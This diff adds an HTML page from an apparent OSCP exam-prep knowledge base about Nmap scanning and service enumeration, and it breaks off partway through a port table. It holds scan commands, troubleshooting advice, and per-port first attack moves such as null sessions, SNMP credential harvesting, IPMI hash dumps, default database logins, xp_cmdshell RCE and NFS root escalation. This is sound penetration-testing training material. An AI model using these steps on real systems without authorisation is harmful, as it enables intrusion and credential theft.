@@ -1,0 +1,578 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Enumeration &amp; Nmap · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">🔎 Enumeration &amp; Nmap</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v3-[nmap]-scanning-finding-which-doors-are-open">[NMAP] SCANNING — finding which doors are open</a><a class="navlink lvl2" href="#v3-[nmap-quick]-the-three-scans-youll-run-on-every-box-one-screen">[NMAP-QUICK]  the three scans you&#x27;ll run on every box  (one screen)</a><a class="navlink lvl2" href="#v3-[nmap-tcp]-the-standard-two-step-explained-[practical]">[NMAP-TCP]  the standard two-step, explained  [PRACTICAL]</a><a class="navlink lvl2" href="#v3-[nmap-udp]-[practical]">[NMAP-UDP]  [PRACTICAL]</a><a class="navlink lvl2" href="#v3-[nmap-service-enum]-[nmap-scripts]-running-targeted-checks-[practical]">[NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]</a><a class="navlink lvl2" href="#v3-[nmap-troubleshooting]-when-a-scan-misbehaves">[NMAP-TROUBLESHOOTING]  when a scan misbehaves</a><a class="navlink lvl1" href="#v3-enumerating-each-service-what-to-do-behind-every-open-door">ENUMERATING EACH SERVICE — what to do behind every open door</a><a class="navlink lvl2" href="#v3-[port-playbook]-the-ports-to-recognise-on-sight-your-first-move">[PORT-PLAYBOOK]  the ports to recognise on sight + your FIRST move</a><a class="navlink lvl2" href="#v3-[enum-ftp]-port-21-ftp-file-transfer">[ENUM-FTP]  Port 21 — FTP (file transfer)</a><a class="navlink lvl2" href="#v3-[enum-ssh]-port-22-ssh-remote-login-shell">[ENUM-SSH]  Port 22 — SSH (remote login shell)</a><a class="navlink lvl2" href="#v3-[enum-smtp]-ports-25465587-mail-smtp">[ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP)</a><a class="navlink lvl2" href="#v3-[enum-dns]-port-53-dns-name-lookups-also-[tech-dns]">[ENUM-DNS]  Port 53 — DNS (name lookups)  → also [TECH-DNS]</a><a class="navlink lvl2" href="#v3-[enum-http]-https-ports-80443808080008443-web">[ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web</a><a class="navlink lvl2" href="#v3-[enum-smb]-ports-139445-smb-windows-file-sharing-also-[tech-smb]">[ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also [TECH-SMB]</a><a class="navlink lvl2" href="#v3-[enum-rpc]-port-135-windows-rpc-port-111-unix-rpc">[ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)</a><a class="navlink lvl2" href="#v3-[enum-ldap]-ports-38963632683269-ldap-the-ad-directory-[ad-enum]-[tech-ldap]">[ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → [AD-ENUM], [TECH-LDAP]</a><a class="navlink lvl2" href="#v3-[enum-kerberos]-port-88-kerberos-ad-login-system-[ad-kerberoast]-[ad-asrep]">[ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → [AD-KERBEROAST], [AD-ASREP]</a><a class="navlink lvl2" href="#v3-[enum-winrm]-ports-59855986-winrm-remote-powershell-[tech-winrm]">[ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → [TECH-WINRM]</a><a class="navlink lvl2" href="#v3-[enum-rdp]-port-3389-rdp-remote-desktop-the-gui-[tech-rdp]">[ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → [TECH-RDP]</a><a class="navlink lvl2" href="#v3-[enum-snmp]-port-161udp-snmp-device-monitoring-[tech-snmp]">[ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring)  → [TECH-SNMP]</a><a class="navlink lvl2" href="#v3-[enum-nfs]-port-2049-111-nfs-unix-file-sharing-[tech-nfs]">[ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → [TECH-NFS]</a><a class="navlink lvl2" href="#v3-[enum-mssql]-port-1433-microsoft-sql-server-[sqli-mssql]-[tech-sql]">[ENUM-MSSQL]  Port 1433 — Microsoft SQL Server  → [SQLI-MSSQL], [TECH-SQL]</a><a class="navlink lvl2" href="#v3-[enum-mysql]-port-3306-mysql-[sqli-mysql]">[ENUM-MYSQL]  Port 3306 — MySQL  → [SQLI-MYSQL]</a><a class="navlink lvl2" href="#v3-[enum-postgres]-port-5432-postgresql-[sqli-postgres]">[ENUM-POSTGRES]  Port 5432 — PostgreSQL  → [SQLI-POSTGRES]</a><a class="navlink lvl2" href="#v3-[enum-redis]-port-6379-redis-in-memory-database">[ENUM-REDIS]  Port 6379 — Redis (in-memory database)</a><a class="navlink lvl2" href="#v3-[enum-mongodb]-port-27017-mongodb">[ENUM-MONGODB]  Port 27017 — MongoDB</a><a class="navlink lvl2" href="#v3-[enum-git]-an-exposed-git-folder-over-http-[found-git]">[ENUM-GIT]  an exposed .git folder over HTTP  → [FOUND-GIT]</a><a class="navlink lvl2" href="#v3-[enum-docker]-ports-23752376-or-a-container-you-land-inside">[ENUM-DOCKER]  Ports 2375/2376, or a container you land inside</a><a class="navlink lvl2" href="#v3-[enum-oracle]-port-1521-oracle-database-tns">[ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)</a><a class="navlink lvl2" href="#v3-[enum-vnc]-port-5900-vnc-remote-desktop">[ENUM-VNC]  Port 5900(+) — VNC (remote desktop)</a><a class="navlink lvl2" href="#v3-[enum-ipmi]-port-623udp-ipmi-server-management">[ENUM-IPMI]  Port 623/UDP — IPMI (server management)</a><a class="navlink lvl2" href="#v3-[enum-unusual-ports]-a-generic-method-for-any-port-you-dont-recognise">[ENUM-UNUSUAL-PORTS]  a generic method for any port you don&#x27;t recognise</a><a class="navlink lvl1" href="#v3-[enum-decision]-port-x-is-open-go-read-this-section">[ENUM-DECISION]  &quot;Port X is open → go read this section&quot;</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v3-oscp-knowledge-base-volume-1">OSCP+ KNOWLEDGE BASE — VOLUME 1</div>
+<h2 id="v3-finding-open-doors-scanning-nmap-enumerating-every-service">FINDING OPEN DOORS: SCANNING (NMAP) + ENUMERATING EVERY SERVICE<a class="anchor" href="#v3-finding-open-doors-scanning-nmap-enumerating-every-service">#</a></h2>
+<blockquote><strong>New here? Read this box first — it unlocks every command in this volume.</strong>  <strong>Placeholders you must replace.</strong> Commands use short stand-ins so you can copy them fast. Before anything works you must set the target IP once, and mentally swap the rest: <code></code><code>bash export IP=10.10.10.5        # ← run this ONCE per box; now every &quot;$IP&quot; below becomes your target mkdir -p scans              # ← make a folder to save scan output into (commands write here) </code><code></code> - <code>$IP</code> = the target machine&#x27;s IP address (you just set it above). - <code>$U</code> = a <strong>username</strong> you found. <code>$P</code> = a <strong>password</strong> you found. Type the real value in place of them. - <code>&lt;something&gt;</code> = &quot;put your own value here&quot; (e.g. <code>&lt;domain&gt;</code> = the target&#x27;s domain name like <code>corp.local</code>). - <code>scans/all-tcp.txt</code> = just a filename to save results into, so you don&#x27;t lose them.  <strong>The tags.</strong> Each section has a <code class="tag">[TAG]</code> in square brackets (like <code class="tag">[ENUM-SMB]</code>). Tags are <strong>bookmarks</strong>: when a line says *&quot;→ <code class="tag">[WEB-QUICK]</code>&quot;* it means *&quot;go read that section next&quot;* — press <strong>Ctrl+F</strong>, type the tag, jump there. Difficulty labels: - <code class="tag">[MUST-MEMORIZE]</code> = learn it by heart, you&#x27;ll type it on every box. - <code class="tag">[MUST-RECOGNIZE]</code> = you don&#x27;t need it memorized, but know what it does when you see it. - <code class="tag">[LOOK-UP]</code> = niche; fine to look up during the exam, don&#x27;t cram it.  <strong>The golden habit:</strong> *enumerate everything before attacking anything.* Most beginners fail by rushing the first open port. Scan all ports, then look at <strong>every</strong> service, then pick the easiest way in.</blockquote>
+<hr>
+<h1 id="v3-[nmap]-scanning-finding-which-doors-are-open">[NMAP] SCANNING — finding which doors are open<a class="anchor" href="#v3-[nmap]-scanning-finding-which-doors-are-open">#</a></h1>
+<p><strong>What is Nmap?</strong> A port scanner. A &quot;port&quot; is a numbered door on a computer (0–65535); a program listening behind a door is a &quot;service&quot; (web server, file share, database…). Nmap knocks on the doors and tells you which are <strong>open</strong> and what&#x27;s behind them. This is always your <strong>first step</strong> on a new target.</p>
+<h2 id="v3-[nmap-quick]-the-three-scans-youll-run-on-every-box-one-screen">[NMAP-QUICK]  the three scans you&#x27;ll run on every box  (one screen)<a class="anchor" href="#v3-[nmap-quick]-the-three-scans-youll-run-on-every-box-one-screen">#</a></h2>
+<pre><code># 1) Fast: knock on ALL 65535 doors, just tell me which are OPEN   [MUST-MEMORIZE]
+nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
+#    -p-           = scan every port (not just the common 1000)
+#    --min-rate 2000 = go fast (send ≥2000 packets/sec); lower to 1000 if results look flaky
+#    -Pn           = &quot;assume host is up, skip the ping&quot; (many boxes block ping and look &#x27;down&#x27;)
+#    -oN file      = save a readable copy to that file (ALWAYS save — you&#x27;ll re-read it)
+
+# 2) Deep: for the ports found open, get the software + version + run default checks   [MUST-MEMORIZE]
+nmap -p22,80,445 -sCV -Pn -oN scans/services.txt $IP
+#    -p22,80,445   = only the ports step 1 found open (replace with your real list)
+#    -sC           = run Nmap&#x27;s &quot;default scripts&quot; (safe probes that reveal extra info)
+#    -sV           = detect the exact service + version (e.g. &quot;Apache 2.4.49&quot;) → search it for exploits
+#    (-sCV is just -sC and -sV together)
+
+# 3) UDP: a few services only answer on UDP (different protocol) — scan the top ones   [MUST-RECOGNIZE]
+nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP
+#    -sU           = scan UDP instead of TCP
+#    --top-ports 100 = only the 100 most common UDP ports (full UDP is painfully slow)</code></pre>
+<p><strong>Read the results like this:</strong></p>
+<ul>
+<li>Step 1 tells you *which* doors are open. Note every number.</li>
+<li>Step 2 tells you *what program + version* is behind each door → that version is what you search for known exploits.</li>
+<li>Step 3 catches UDP-only services (SNMP on 161, DNS on 53, TFTP on 69) that TCP scans miss.</li>
+</ul>
+<h2 id="v3-[nmap-tcp]-the-standard-two-step-explained-[practical]">[NMAP-TCP]  the standard two-step, explained  [PRACTICAL]<a class="anchor" href="#v3-[nmap-tcp]-the-standard-two-step-explained-[practical]">#</a></h2>
+<p><strong>Why two steps?</strong> Scanning all 65535 ports *with* version detection is very slow. So: <strong>step 1</strong> finds open ports fast (no version detection); <strong>step 2</strong> does the slow version/script work <strong>only</strong> on the handful that were open. Never run <code>-sCV -p-</code> together — you&#x27;ll wait forever.</p>
+<p><strong>The flags that matter (and what each is for):</strong></p>
+<ul>
+<li><code>-p-</code> → scan all 65535 ports. Without it, Nmap only checks the common 1000 and <strong>misses services on weird high ports</strong> (a very common way beginners miss the way in).</li>
+<li><code>--min-rate 2000</code> → speed. If a box is fragile and results change between runs, drop to <code>--min-rate 1000</code>.</li>
+<li><code>-Pn</code> → skip the &quot;is it alive?&quot; ping. Windows and firewalled boxes often block ping and would otherwise be wrongly reported as &quot;down&quot;. **Always use <code>-Pn</code>.**</li>
+<li><code>-sC</code> (default scripts), <code>-sV</code> (versions) → the info that tells you *how* to attack.</li>
+<li><code>-oN scans/file.txt</code> (readable) or <code>-oA scans/name</code> (saves 3 formats at once) → <strong>always save output.</strong> You will re-read scans constantly.</li>
+<li><code>-T4</code> → a coarser speed dial; <code>--min-rate</code> is the finer control. Either is fine.</li>
+</ul>
+<p><strong>One-command version (fine for a single box, just slower):</strong></p>
+<pre><code>nmap -p- -sCV -Pn --min-rate 1500 -oA scans/full $IP    # all ports + versions in one go</code></pre>
+<p><strong>Faster port discovery (optional tool):</strong> <code>rustscan -a $IP -- -sCV -oN scans/services.txt</code> — rustscan finds open ports very fast, then hands them to Nmap. <code class="tag">[LOOK-UP]</code></p>
+<h2 id="v3-[nmap-udp]-[practical]">[NMAP-UDP]  [PRACTICAL]<a class="anchor" href="#v3-[nmap-udp]-[practical]">#</a></h2>
+<p>UDP scanning is slow and unreliable (UDP services often don&#x27;t reply, so Nmap has to guess). <strong>Scan the top 100–200 UDP ports, never all of them.</strong></p>
+<pre><code>nmap -sU --top-ports 200 --min-rate 1000 -Pn $IP</code></pre>
+<ul>
+<li><code>open|filtered</code> = &quot;no reply, can&#x27;t tell&quot; — normal for UDP. For a promising one, probe it directly with its own tool.</li>
+<li><strong>High-value UDP ports to care about:</strong> 161 (SNMP — often leaks creds!), 53 (DNS), 69 (TFTP), 123 (NTP), 500 (IKE/VPN), 137 (NetBIOS).</li>
+</ul>
+<h2 id="v3-[nmap-service-enum]-[nmap-scripts]-running-targeted-checks-[practical]">[NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]<a class="anchor" href="#v3-[nmap-service-enum]-[nmap-scripts]-running-targeted-checks-[practical]">#</a></h2>
+<p>Nmap ships with hundreds of small scripts (the &quot;NSE&quot;). You can aim specific ones at a service:</p>
+<pre><code>nmap --script &quot;safe or default&quot; -p&lt;ports&gt; $IP          # run all the safe/standard checks
+# service-specific bundles:
+nmap --script &quot;smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode&quot; -p445 $IP   # SMB
+nmap --script &quot;http-enum,http-title,http-headers,http-methods&quot; -p80 $IP                        # web
+nmap --script &quot;ftp-anon,ftp-syst&quot; -p21 $IP                                                     # FTP
+nmap --script vuln -p&lt;ports&gt; $IP     # broad &quot;any known vulns?&quot; — NOISY, gives false alarms [LOOK-UP]</code></pre>
+<ul>
+<li>Treat <code>--script vuln</code> as a <strong>lead generator, not proof</strong> — it flags maybes; you still verify by hand.</li>
+<li>Find a script: <code>ls /usr/share/nmap/scripts | grep &lt;service&gt;</code>. Read what it does: <code>nmap --script-help &lt;name&gt;</code>.</li>
+</ul>
+<h2 id="v3-[nmap-troubleshooting]-when-a-scan-misbehaves">[NMAP-TROUBLESHOOTING]  when a scan misbehaves<a class="anchor" href="#v3-[nmap-troubleshooting]-when-a-scan-misbehaves">#</a></h2>
+<div class="tablewrap"><table><thead><tr><th>What you see</th><th>Why</th><th>What to do</th></tr></thead><tbody>
+<tr><td>Every port says &quot;filtered&quot;</td><td>A firewall is dropping your probes, or ping is blocked</td><td>Add <code>-Pn</code>; lower <code>--min-rate</code>; try <code>-sT</code> (full-connect scan), especially through a proxy</td></tr>
+<tr><td>Host reported &quot;down&quot; but the website loads</td><td>Ping (ICMP) is blocked</td><td>Always use <code>-Pn</code></td></tr>
+<tr><td>Version looks wrong / &quot;unsure&quot;</td><td>The service hides its banner</td><td>Probe by hand (<code>nc</code>, <code>curl</code>, the service&#x27;s own client); add <code>--version-intensity 9</code></td></tr>
+<tr><td>Scan is crawling</td><td>UDP, or too-high rate on a lossy link</td><td>UDP: top-ports only. TCP: <code>--min-rate 1000</code></td></tr>
+<tr><td>Fails through proxychains</td><td>SOCKS proxies can&#x27;t carry raw SYN/UDP packets</td><td>Use <code>-sT -Pn</code> (TCP connect) only; no UDP over a proxy</td></tr>
+<tr><td>Different results each run</td><td>Rate too high, packets getting dropped</td><td>Lower <code>--min-rate</code>, run again</td></tr>
+<tr><td>Box is clearly up but almost everything is &quot;filtered&quot;</td><td>possible <strong>port knocking</strong> (a service opens only after you connect to a secret sequence of ports first)</td><td>look for the knock sequence in a config/README/comment you looted; then <code>for p in 7000 8000 9000; do nmap -Pn -p $p $IP; done</code> and re-scan — the hidden port opens</td></tr>
+</tbody></table></div>
+<p><strong>Time-wasters to avoid (rabbit holes):</strong> believing <code>--script vuln</code> without checking; obsessing over a single &quot;filtered&quot; port; running full UDP <code>-p-</code>; fussing over exact OS-detection guesses.</p>
+<hr>
+<h1 id="v3-enumerating-each-service-what-to-do-behind-every-open-door">ENUMERATING EACH SERVICE — what to do behind every open door<a class="anchor" href="#v3-enumerating-each-service-what-to-do-behind-every-open-door">#</a></h1>
+<blockquote>For each service: <strong>what it is</strong> (plain English) → <strong>commands</strong> (every line commented) → <strong>what to check, what can go wrong, and where it leads.</strong> Jump straight to the port you found open using the decision table at the bottom (<code class="tag">[ENUM-DECISION]</code>).</blockquote>
+<h2 id="v3-[port-playbook]-the-ports-to-recognise-on-sight-your-first-move">[PORT-PLAYBOOK]  the ports to recognise on sight + your FIRST move<a class="anchor" href="#v3-[port-playbook]-the-ports-to-recognise-on-sight-your-first-move">#</a></h2>
+<p>When nmap comes back, don&#x27;t panic at the list — recognise each port and reach for its first move. <strong>Attack priority: web (80/443) → SMB (445) → AD (88/389) → databases → the rest.</strong></p>
+<div class="tablewrap"><table><thead><tr><th>Port(s)</th><th>Protocol / service</th><th>What it is (plain English)</th><th>Your FIRST move</th><th>Jump</th></tr></thead><tbody>
+<tr><td>21</td><td>FTP</td><td>file transfer, often <strong>anonymous</strong></td><td>try <code>anonymous</code>/any-pass; download everything; can you upload?</td><td><code class="tag">[ENUM-FTP]</code></td></tr>
+<tr><td>22</td><td>SSH</td><td>remote login shell</td><td>note the version; only useful with a <strong>found</strong> password/key (don&#x27;t brute)</td><td><code class="tag">[ENUM-SSH]</code></td></tr>
+<tr><td>23</td><td>Telnet</td><td>ancient cleartext login</td><td>grab banner; try creds you have</td><td><code class="tag">[ENUM-UNUSUAL-PORTS]</code></td></tr>
+<tr><td>25/465/587</td><td>SMTP</td><td>mail</td><td>enumerate <strong>usernames</strong> (<code>VRFY</code>, <code>RCPT</code>) → feed AD attacks</td><td><code class="tag">[ENUM-SMTP]</code></td></tr>
+<tr><td>53</td><td>DNS</td><td>name lookups</td><td>attempt a <strong>zone transfer</strong>; on AD it reveals DCs</td><td><code class="tag">[ENUM-DNS]</code></td></tr>
+<tr><td>80/443/8080/8000</td><td>HTTP(S)</td><td>⭐ a <strong>website</strong> — #1 foothold</td><td>enumerate FULLY: <code>whatweb</code>, dir-brute, <strong>version→exploit</strong></td><td><code class="tag">[WEB-QUICK]</code></td></tr>
+<tr><td>88</td><td>Kerberos</td><td>AD authentication</td><td>🚨 <strong>it&#x27;s a DOMAIN CONTROLLER</strong> — switch to AD mode</td><td><code class="tag">[ENUM-KERBEROS]</code> / <code class="tag">[AD-QUICK]</code></td></tr>
+<tr><td>110/143</td><td>POP3/IMAP</td><td>mailboxes</td><td>test found creds; read mail for secrets</td><td><code class="tag">[ENUM-UNUSUAL-PORTS]</code></td></tr>
+<tr><td>111</td><td>RPCbind</td><td>Unix RPC → points to NFS</td><td><code>showmount -e</code> to find NFS exports</td><td><code class="tag">[ENUM-NFS]</code></td></tr>
+<tr><td>135</td><td>MSRPC</td><td>Windows RPC</td><td><code>rpcclient -U &#x27;&#x27; -N</code> null session → users</td><td><code class="tag">[ENUM-RPC]</code></td></tr>
+<tr><td>139/445</td><td>SMB</td><td>⭐ Windows file sharing</td><td><code>nxc smb</code>; try <strong>null session</strong> shares/users</td><td><code class="tag">[ENUM-SMB]</code></td></tr>
+<tr><td>161 (UDP)</td><td>SNMP</td><td>device monitoring</td><td><code>snmpwalk -c public</code> → <strong>creds in process args</strong> (easy win)</td><td><code class="tag">[ENUM-SNMP]</code></td></tr>
+<tr><td>389/636/3268</td><td>LDAP</td><td>the AD directory</td><td>anonymous bind dump; passwords hide in <code>description</code></td><td><code class="tag">[ENUM-LDAP]</code></td></tr>
+<tr><td>623 (UDP)</td><td>IPMI</td><td>server management</td><td>dump the <strong>pre-auth hash</strong> → crack it</td><td><code class="tag">[ENUM-IPMI]</code></td></tr>
+<tr><td>1433</td><td>MSSQL</td><td>MS SQL Server database</td><td>creds → <code>xp_cmdshell</code> <strong>RCE</strong></td><td><code class="tag">[ENUM-MSSQL]</code></td></tr>
+<tr><td>1521</td><td>Oracle</td><td>Oracle database</td><td>SID-guess → default creds (<code>scott/tiger</code>) → RCE</td><td><code class="tag">[ENUM-ORACLE]</code></td></tr>
+<tr><td>2049</td><td>NFS</td><td>Unix file shares</td><td>mount it; **<code>no_root_squash</code>** → root</td><td><code class="tag">[ENUM-NFS]</code></td></tr>
+<tr><td>3306</td><td>MySQL</td><td>database</td><td>try <code>root</code>/blank; <code>FILE</code> priv → read/write files</td><td><code class="tag">[ENUM-MYSQL]</code></td></tr>
